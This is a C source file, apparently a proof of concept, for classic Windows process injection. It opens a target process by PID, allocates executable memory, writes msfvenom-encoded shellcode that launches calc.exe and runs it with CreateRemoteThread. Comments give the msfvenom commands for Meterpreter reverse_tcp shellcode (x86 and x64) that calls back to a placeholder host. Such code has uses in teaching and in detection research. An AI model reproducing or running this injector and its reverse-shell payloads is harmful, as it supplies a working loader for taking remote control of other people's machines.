/* [!] TARGET PROCESS IS SELECTED at RUNTIME by indicating its PID (FOR POC USAGE)
 * This program injects shellcode into a specified target process (e.g., Notepad) by:
 * 1. Opening the target process with full access rights.
 * 2. Allocating memory within the target process for the shellcode.
 * 3. Writing the shellcode into the allocated memory.
 * 4. Creating a remote thread to execute the shellcode within the context of the target process.
 */

#include <windows.h>
#include <stdio.h>

int main() {
   
//Shellcode To open calc.exe on x86 (TARGET process must be a 32-bit application)
//msfvenom -p windows/exec cmd=calc.exe -f c -e x86/shikata_ga_nai -b "\x00\x0A\x0D" --smallest
    unsigned char buf[] =
	"\xda\xdf\xd9\x74\x24\xf4\xbd\xf5\xf7\x07\xda\x58\x29\xc9"
	"\xb1\x31\x83\xe8\xfc\x31\x68\x14\x03\x68\xe1\x15\xf2\x26"
	"\xe1\x58\xfd\xd6\xf1\x3c\x77\x33\xc0\x7c\xe3\x37\x72\x4d"
	"\x67\x15\x7e\x26\x25\x8e\xf5\x4a\xe2\xa1\xbe\xe1\xd4\x8c"
	"\x3f\x59\x24\x8e\xc3\xa0\x79\x70\xfa\x6a\x8c\x71\x3b\x96"
	"\x7d\x23\x94\xdc\xd0\xd4\x91\xa9\xe8\x5f\xe9\x3c\x69\x83"
	"\xb9\x3f\x58\x12\xb2\x19\x7a\x94\x17\x12\x33\x8e\x74\x1f"
	"\x8d\x25\x4e\xeb\x0c\xec\x9f\x14\xa2\xd1\x10\xe7\xba\x16"
	"\x96\x18\xc9\x6e\xe5\xa5\xca\xb4\x94\x71\x5e\x2f\x3e\xf1"
	"\xf8\x8b\xbf\xd6\x9f\x58\xb3\x93\xd4\x07\xd7\x22\x38\x3c"
	"\xe3\xaf\xbf\x93\x62\xeb\x9b\x37\x2f\xaf\x82\x6e\x95\x1e"
	"\xba\x71\x76\xfe\x1e\xf9\x9a\xeb\x12\xa0\xf0\xea\xa1\xde"
	"\xb6\xed\xb9\xe0\xe6\x85\x88\x6b\x69\xd1\x14\xbe\xce\x2d"
	"\x5f\xe3\x66\xa6\x06\x71\x3b\xab\xb8\xaf\x7f\xd2\x3a\x5a"
	"\xff\x21\x22\x2f\xfa\x6e\xe4\xc3\x76\xfe\x81\xe3\x25\xff"
	"\x83\x87\xa8\x93\x48\x66\x4f\x14\xea\x76";

	//ShellCode (x86) for windows/meterpreter/reverse_tcp LHOST=hostIP LPORT=hostPORT with shikata_ga_nai (Requires a 32-bit running Process)
	// //msfvenom -p windows/meterpreter/reverse_tcp LHOST=hostIP LPORT=hostPORT -f c -e x86/shikata_ga_nai
    //ShellCode (x64) for windows/x64/meterpreter/reverse_tcp LHOST=hostIP LPORT=hostPORT with zutto_dekiru (Requires a 64-bit running Process)
	////msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=hostIP LPORT=hostPORT -f c -e x64/zutto_dekiru

    DWORD pid;
    printf("Enter Target PID: ");
    scanf_s("%lu", &pid);

    // Open a handle to the target process with all access rights
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        // If opening the process fails, print the error and exit
        printf("Failed to open process. Error: %lu\n", GetLastError());
        return 1;
    }

    // Allocate memory in the remote process for the buffer
    LPVOID freeMem = VirtualAllocEx(hProcess, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (freeMem == NULL) {
        // If memory allocation fails, print the error, close the process handle, and exit
        printf("Error allocating memory in remote process. Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    // Write the contents of 'buf' into the allocated memory of the remote process
    BOOL success = WriteProcessMemory(hProcess, freeMem, buf, sizeof(buf), NULL);
    if (!success) {
        // If writing to memory fails, print the error, free the allocated memory, close the process handle, and exit
        printf("Error writing process memory. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, freeMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Create a remote thread in the target process to execute the code at 'freeMem'
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)freeMem, NULL, 0, NULL);
    if (hThread == NULL) {
        // If creating the thread fails, print the error, free the allocated memory, close the process handle, and exit
        printf("Error creating remote thread. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, freeMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}